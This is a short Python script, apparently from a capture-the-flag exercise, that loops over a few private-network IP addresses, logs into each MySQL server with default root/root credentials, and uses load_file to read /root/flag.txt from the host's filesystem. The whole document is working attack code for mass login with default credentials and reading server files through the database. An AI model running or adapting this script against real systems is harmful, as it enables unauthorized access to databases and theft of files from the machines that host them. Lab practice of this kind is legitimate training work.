import MySQLdb
for i in range(164,167):
	try:
		ip='192.168.112.'+str(i)
		conn=MySQLdb.connect(host=ip,user='root',passwd='root',connect_timeout=1)
		cursor=conn.cursor()
		sql="select load_file('/root/flag.txt')"
		try:
			cursor.execute(sql)
			result=cursor.fetchall()
			print i,result
			conn.close()
		except:
			print i,'exec down'
	except:
		print i,'con down'
